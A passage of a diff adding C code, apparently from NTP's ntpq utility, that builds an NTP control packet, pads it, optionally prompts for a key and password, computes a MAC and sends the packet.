+			"***Internal error!  qsize (%d) too large\n",
+			qsize);
+		return 1;
+	}
+
+	/*
+	 * Fill in the packet
+	 */
+	qpkt.li_vn_mode = PKT_LI_VN_MODE(0, pktversion, MODE_CONTROL);
+	qpkt.r_m_e_op = (u_char)(opcode & CTL_OP_MASK);
+	qpkt.sequence = htons(sequence);
+	qpkt.status = 0;
+	qpkt.associd = htons((u_short)associd);
+	qpkt.offset = 0;
+	qpkt.count = htons((u_short)qsize);
+
+	pktsize = CTL_HEADER_LEN;
+
+	/*
+	 * If we have data, copy and pad it out to a 32-bit boundary.
+	 */
+	if (qsize > 0) {
+		memcpy(qpkt.data, qdata, (size_t)qsize);
+		pktsize += qsize;
+		while (pktsize & (sizeof(uint32_t) - 1)) {
+			qpkt.data[qsize++] = 0;
+			pktsize++;
+		}
+	}
+
+	/*
+	 * If it isn't authenticated we can just send it.  Otherwise
+	 * we're going to have to think about it a little.
+	 */
+	if (!auth && !always_auth) {
+		return sendpkt(&qpkt, pktsize);
+	} 
+
+	/*
+	 * Pad out packet to a multiple of 8 octets to be sure
+	 * receiver can handle it.
+	 */
+	while (pktsize & 7) {
+		qpkt.data[qsize++] = 0;
+		pktsize++;
+	}
+
+	/*
+	 * Get the keyid and the password if we don't have one.
+	 */
+	if (info_auth_keyid == 0) {
+		key_id = getkeyid("Keyid: ");
+		if (key_id == 0 || key_id > NTP_MAXKEY) {
+			fprintf(stderr, 
+				"Invalid key identifier\n");
+			return 1;
+		}
+		info_auth_keyid = key_id;
+	}
+	if (!authistrusted(info_auth_keyid)) {
+		pass = getpass_keytype(info_auth_keytype);
+		if ('\0' == pass[0]) {
+			fprintf(stderr, "Invalid password\n");
+			return 1;
+		}
+		authusekey(info_auth_keyid, info_auth_keytype,
+			   (u_char *)pass);
+		authtrust(info_auth_keyid, 1);
+	}
+
+	/*
+	 * Do the encryption.
+	 */
+	maclen = authencrypt(info_auth_keyid, (void *)&qpkt, pktsize);
+	if (!maclen) {  
+		fprintf(stderr, "Key not found\n");
+		return 1;
+	} else if ((size_t)maclen != (info_auth_hashlen + sizeof(keyid_t))) {
+		fprintf(stderr,
+			"%d octet MAC, %lu expected with %lu octet digest\n",
+			maclen, (u_long)(info_auth_hashlen + sizeof(keyid_t)),
+			(u_long)info_auth_hashlen);
+		return 1;
+	}
+	
+	return sendpkt((char *)&qpkt, pktsize + maclen);
+}
